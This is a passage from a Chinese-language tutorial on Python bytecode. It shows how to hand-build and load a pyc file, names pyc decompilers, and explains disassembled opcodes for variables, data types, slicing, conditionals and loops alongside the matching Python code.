class="line">c = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>上述代码编译之后的结果，就是我们要构建的 PyCodeObject。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> opcode <span class="keyword">import</span> opmap</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> CodeType</span><br><span class="line"><span class="keyword">from</span> importlib.util <span class="keyword">import</span> MAGIC_NUMBER</span><br><span class="line">HEADER = MAGIC_NUMBER + <span class="string">b&quot;\x00&quot;</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># 时间随便写</span></span><br><span class="line">HEADER += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">int</span>(time.time()))</span><br><span class="line"><span class="comment"># 大小随便写</span></span><br><span class="line">HEADER += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">47</span>)</span><br><span class="line"><span class="comment"># 构建 PyCodeObject</span></span><br><span class="line">code = CodeType(</span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_argcount</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_posonlyargcount</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_kwonlyargcount</span></span><br><span class="line">    <span class="number">3</span>, <span class="comment"># co_nlocals</span></span><br><span class="line">    <span class="number">1</span>, <span class="comment"># co_stacksize</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_flags</span></span><br><span class="line">    <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="comment"># a = 1 分为两步</span></span><br><span class="line">            <span class="comment"># 第一步：先通过 LOAD_CONST 将常量加载进来</span></span><br><span class="line">            <span class="comment"># 因此指令是 LOAD_CONST，然后参数是 0</span></span><br><span class="line">            <span class="comment"># 表示加载常量池 co_consts 中索引为 0 的常量</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># 第二步：通过 STORE_NAME 将常量和符号绑定起来</span></span><br><span class="line">            <span class="comment"># 参数是 0，表示和符号表中索引为 0 的符号进行绑定</span></span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># b = 2</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">1</span>,</span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">1</span>,</span><br><span class="line">            <span class="comment"># c = 3</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">2</span>,</span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">2</span>,</span><br><span class="line">            <span class="comment"># 结尾要 LOAD 一个 None，然后返回</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">3</span>,</span><br><span class="line">            opmap[<span class="string">&quot;RETURN_VALUE&quot;</span>]</span><br><span class="line">    ]), <span class="comment"># co_code</span></span><br><span class="line">    (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="literal">None</span>), <span class="comment"># co_consts</span></span><br><span class="line">    (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>), <span class="comment"># co_names</span></span><br><span class="line">    (), <span class="comment"># co_varnames</span></span><br><span class="line">            <span class="string">&quot;out.py&quot;</span>, <span class="comment"># co_filename</span></span><br><span class="line">            <span class="string">&quot;&lt;module&gt;&quot;</span>, <span class="comment"># co_name</span></span><br><span class="line">            <span class="number">1</span>, <span class="comment"># co_firstlineno</span></span><br><span class="line">            <span class="string">b&quot;&quot;</span>, <span class="comment"># co_lnotab</span></span><br><span class="line">            (), <span class="comment"># freevars</span></span><br><span class="line">            () <span class="comment"># cellvars</span></span><br><span class="line">            )</span><br><span class="line">    <span class="comment"># pyc 文件内容</span></span><br><span class="line">            pyc_content = HEADER + marshal.dumps(code)</span><br><span class="line">            <span class="comment"># 生成 pyc 文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.pyc&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">        f.write(pyc_content)</span><br><span class="line">            <span class="comment"># 然后加载生成的 pyc 文件</span></span><br><span class="line">            <span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line">            mod = SourcelessFileLoader(</span><br><span class="line">                <span class="string">&quot;out&quot;</span>, <span class="string">&quot;out.pyc&quot;</span></span><br><span class="line">            ).load_module()</span><br><span class="line">            <span class="built_in">print</span>(mod) <span class="comment"># &lt;module &#x27;out&#x27; from &#x27;out.pyc&#x27;&gt;</span></span><br><span class="line">            <span class="built_in">print</span>(mod.a) <span class="comment"># 1</span></span><br><span class="line">            <span class="built_in">print</span>(mod.b) <span class="comment"># 2</span></span><br><span class="line">            <span class="built_in">print</span>(mod.c) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a><strong>逆向工具</strong></h3><p>我们可以通过如下方式来反编译 pyc 文件，拿到源码：</p><p><a href="https://tool.lu/pyc/"><strong>在线工具</strong></a></p><p><strong>pycdc</strong>：编译演示<a href="https://github.com/zrax/pycdc">https://github.com/zrax/pycdc</a></p><p>uncompyle6：安装方式 pip install uncompyle6</p><h2 id="pyc-字节码"><a href="#pyc-字节码" class="headerlink" title="pyc 字节码"></a><strong>pyc</strong> <strong>字节码</strong></h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a><strong>反汇编</strong></h3><p>字节码拿过来<strong>反汇编</strong>就得到了针对 Python 虚拟机的<strong>汇编代码</strong>，类似于 x86 汇编，但是比 x86 的好读多了。通过 dis.dis() 就可以将字节码转为可读的伪代码。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.pyc&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">raw = f.read()</span><br><span class="line">code = marshal.loads(raw[<span class="number">16</span>:])</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (a)</span><br><span class="line"><span class="number">4</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">6</span> STORE_NAME <span class="number">1</span> (b)</span><br><span class="line"><span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">3</span>)</span><br><span class="line"><span class="number">10</span> STORE_NAME <span class="number">2</span> (c)</span><br><span class="line"><span class="number">12</span> LOAD_CONST <span class="number">3</span> (<span class="literal">None</span>)</span><br><span class="line"><span class="number">14</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>结构如下：</p><p>源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a><strong>常量</strong></h3><p>LOAD_CONST 用于加载常量，比如数值、字符串等等，一般用于传给函数的参数，例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">55</span> <span class="number">12</span> LOAD_GLOBAL <span class="number">1</span> (test)</span><br><span class="line"><span class="number">15</span> LOAD_FAST <span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">1</span> (<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line"><span class="number">21</span> CALL_FUNCTION <span class="number">2</span></span><br></pre></td></tr></table></figure><p>转为 python 代码就是：</p><p>test(2, “output”)</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a><strong>全局变量</strong></h4><p>LOAD_GLOBAL 用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p><p>STORE_GLOBAL 用来给全局变量赋值。</p><p>例如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">101</span>)</span><br><span class="line"><span class="number">2</span> STORE_GLOBAL <span class="number">0</span> (num)</span><br><span class="line"><span class="number">6</span> <span class="number">4</span> LOAD_GLOBAL <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">6</span> LOAD_GLOBAL <span class="number">0</span> (num)</span><br><span class="line"><span class="number">8</span> CALL_FUNCTION <span class="number">1</span></span><br></pre></td></tr></table></figure><p>对应的 python 代</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="keyword">global</span> num</span><br><span class="line">num = <span class="number">101</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a><strong>局部变量</strong></h4><p>LOAD_FAST 一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。</p><p>STORE_FAST 一般用于保存值到局部变</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_FAST <span class="number">0</span> (n)</span><br><span class="line"><span class="number">3</span> <span class="number">4</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">6</span> STORE_FAST <span class="number">1</span> (p)</span><br><span class="line"><span class="number">4</span> <span class="number">8</span> LOAD_FAST <span class="number">0</span> (n)</span><br><span class="line"><span class="number">10</span> LOAD_FAST <span class="number">1</span> (p)</span><br><span class="line"><span class="number">12</span> BINARY_ADD</span><br><span class="line"><span class="number">14</span> STORE_FAST <span class="number">0</span> (n)</span><br></pre></td></tr></table></figure><p>对应的 python 代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">n = n + p</span><br></pre></td></tr></table></figure><p>函数的参数也算局部变量，如何区分出是函数参数还是其他局部变量呢？</p><p><strong>参数没有初始化语句</strong>，也就是从函数开始到 LOAD_FAST 该变量的位置，如果没有看到 STORE_FAST ，那么该变量就是函数参数。</p><p>而局部变量在使用之前肯定会使用 STORE_FAST 进行初始化。</p><p>例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of &lt;code <span class="built_in">object</span> test at <span class="number">0x1A9F3E62240</span>, file <span class="string">&quot;test.py&quot;</span>, line <span class="number">1</span>&gt;:</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_FAST <span class="number">1</span> (local)</span><br><span class="line"><span class="number">3</span> <span class="number">4</span> LOAD_GLOBAL <span class="number">0</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">6</span> LOAD_FAST <span class="number">1</span> (local)</span><br><span class="line"><span class="number">8</span> LOAD_FAST <span class="number">0</span> (arg1)</span><br><span class="line"><span class="number">10</span> CALL_FUNCTION <span class="number">2</span></span><br></pre></td></tr></table></figure><p>对应的 python 代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">arg1</span>):</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(local, arg1)</span><br></pre></td></tr></table></figure><h3 id="常用数据类型"><a href="#常用数据类型" class="headerlink" title="常用数据类型"></a><strong>常用数据类型</strong></h3><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h4><p>BUILD_LIST 用于创建一个 list。</p><p>例如</p><p>1 0 LOAD_CONST 0 (1)</p><p>2 LOAD_CONST 1 (2)</p><p>4 BUILD_LIST 2</p><p>6 STORE_NAME 0 (k)</p><p>对应 k &#x3D; [1, 2] 。</p><p>通过列表推导式（语法糖）构建列表：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (&lt;code <span class="built_in">object</span> &lt;listcomp&gt;&gt;)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="string">&#x27;&lt;listcomp&gt;&#x27;</span>)</span><br><span class="line"><span class="number">4</span> MAKE_FUNCTION <span class="number">0</span></span><br><span class="line"><span class="number">6</span> LOAD_NAME <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line"><span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">32</span>)</span><br><span class="line"><span class="number">10</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">12</span> GET_ITER</span><br><span class="line"><span class="number">14</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">16</span> STORE_NAME <span class="number">1</span> (a)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">3</span> (<span class="literal">None</span>)</span><br><span class="line"><span class="number">20</span> RETURN_VALUE</span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> &lt;listcomp&gt;&gt;:</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"><span class="number">2</span> LOAD_FAST <span class="number">0</span> (<span class="number">.0</span>)</span><br><span class="line">&gt;&gt; <span class="number">4</span> FOR_ITER <span class="number">12</span> (to <span class="number">18</span>)</span><br><span class="line"><span class="number">6</span> STORE_FAST <span class="number">1</span> (i)</span><br><span class="line"><span class="number">8</span> LOAD_FAST <span class="number">1</span> (i)</span><br><span class="line"><span class="number">10</span> LOAD_CONST <span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">12</span> BINARY_ADD</span><br><span class="line"><span class="number">14</span> LIST_APPEND <span class="number">2</span></span><br><span class="line"><span class="number">16</span> JUMP_ABSOLUTE <span class="number">4</span></span><br><span class="line">&gt;&gt; <span class="number">18</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>对应语句 a &#x3D; [i+2 for i in range(32)]</p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a><strong>字典</strong></h4><p>BUILD_MAP 用于创建一个空的 dict。</p><p>STORE_MAP 用于初始化 dict 的内容。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">4</span> BUILD_MAP <span class="number">1</span></span><br><span class="line"><span class="number">6</span> STORE_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">2</span> <span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">10</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">12</span> LOAD_CONST <span class="number">0</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">14</span> STORE_SUBSCR</span><br></pre></td></tr></table></figure><p>分别对应 k &#x3D; {‘a’: 1} 和 k[‘a’] &#x3D; 2 。</p><h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a><strong>切片</strong></h4><p>BUILD_SLICE 用于创建切片。对于 list、tuple、字符串都可以使用切片的方式进行访问。</p><p>但是要注意 BUILD_SLICE 用于 [x:y:z] 这种类型的切片，结合 BINARY_SUBSCR 读取切片的值，结合</p><p>STORE_SUBSCR 用于修改切片的值。</p><p>例如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">4</span> LOAD_CONST <span class="number">2</span> (<span class="number">3</span>)</span><br><span class="line"><span class="number">6</span> BUILD_LIST <span class="number">3</span></span><br><span class="line"><span class="number">8</span> STORE_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">2</span> <span class="number">10</span> LOAD_CONST <span class="number">3</span> (<span class="number">10</span>)</span><br><span class="line"><span class="number">12</span> BUILD_LIST <span class="number">1</span></span><br><span class="line"><span class="number">14</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">16</span> LOAD_CONST <span class="number">4</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">20</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">22</span> BUILD_SLICE <span class="number">3</span></span><br><span class="line"><span class="number">24</span> STORE_SUBSCR</span><br><span class="line"><span class="number">3</span> <span class="number">26</span> LOAD_CONST <span class="number">5</span> (<span class="number">11</span>)</span><br><span class="line"><span class="number">28</span> BUILD_LIST <span class="number">1</span></span><br><span class="line"><span class="number">30</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">32</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">34</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">36</span> BUILD_SLICE <span class="number">2</span></span><br><span class="line"><span class="number">38</span> STORE_SUBSCR</span><br><span class="line"><span class="number">4</span> <span class="number">40</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">42</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">44</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">46</span> BUILD_SLICE <span class="number">2</span></span><br><span class="line"><span class="number">48</span> BINARY_SUBSCR</span><br><span class="line"><span class="number">50</span> STORE_NAME <span class="number">1</span> (a)</span><br><span class="line"><span class="number">5</span> <span class="number">52</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">54</span> LOAD_CONST <span class="number">4</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">56</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">58</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">60</span> BUILD_SLICE <span class="number">3</span></span><br><span class="line"><span class="number">62</span> BINARY_SUBSCR</span><br><span class="line"><span class="number">64</span> STORE_NAME <span class="number">2</span> (b)</span><br></pre></td></tr></table></figure><p>对应 python 代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">k[<span class="number">0</span>:<span class="number">1</span>:<span class="number">1</span>] = [<span class="number">10</span>]</span><br><span class="line">k[<span class="number">1</span>:<span class="number">2</span>] = [<span class="number">11</span>]</span><br><span class="line">a = k[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line">b = k[<span class="number">0</span>:<span class="number">1</span>:<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a><strong>条件判断</strong></h3><p>以下指令一般用于分支判断跳转：</p><p>POP_JUMP_IF_FALSE ：表示条件结果为 FALSE 就跳转到目标偏移指令</p><p>JUMP_FORWARD ：直接跳转到目标偏移指令</p><p>例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">2</span> <span class="number">4</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">6</span> LOAD_CONST <span class="number">1</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">8</span> COMPARE_OP <span class="number">0</span> (&lt;)</span><br><span class="line"><span class="number">10</span> POP_JUMP_IF_FALSE <span class="number">22</span></span><br><span class="line"><span class="number">3</span> <span class="number">12</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">14</span> LOAD_CONST <span class="number">2</span> (<span class="string">&#x27;i &lt; 5&#x27;</span>)</span><br><span class="line"><span class="number">16</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">18</span> POP_TOP</span><br><span class="line"><span class="number">20</span> JUMP_FORWARD <span class="number">26</span> (to <span class="number">48</span>)</span><br><span class="line"><span class="number">4</span> &gt;&gt; <span class="number">22</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">24</span> LOAD_CONST <span class="number">1</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">26</span> COMPARE_OP <span class="number">4</span> (&gt;)</span><br><span class="line"><span class="number">28</span> POP_JUMP_IF_FALSE <span class="number">40</span></span><br><span class="line"><span class="number">5</span> <span class="number">30</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">32</span> LOAD_CONST <span class="number">3</span> (<span class="string">&#x27;i &gt; 5&#x27;</span>)</span><br><span class="line"><span class="number">34</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">36</span> POP_TOP</span><br><span class="line"><span class="number">38</span> JUMP_FORWARD <span class="number">8</span> (to <span class="number">48</span>)</span><br><span class="line"><span class="number">7</span> &gt;&gt; <span class="number">40</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">42</span> LOAD_CONST <span class="number">4</span> (<span class="string">&#x27;i = 5&#x27;</span>)</span><br><span class="line"><span class="number">44</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">46</span> POP_TOP</span><br></pre></td></tr></table></figure><p>对应 python 代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> i &lt; <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i &lt; 5&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> i &gt; <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i &gt; 5&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i = 5&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a><strong>循环</strong></h3><h4 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a><strong>while</strong> <strong>循环</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">2</span> &gt;&gt; <span class="number">4</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">6</span> LOAD_CONST <span class="number">1</span> (<span class="number">10</span>)</span><br><span class="line"><span class="number">8</span> COMPARE_OP <span class="number">0</span> (&lt;)</span><br><span class="line"><span class="number">10</span> POP_JUMP_IF_FALSE <span class="number">22</span></span><br><span class="line"><span class="number">3</span> <span class="number">12</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">14</span> LOAD_CONST <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">16</span> INPLACE_ADD</span><br><span class="line"><span class="number">18</span> STORE_NAME <span 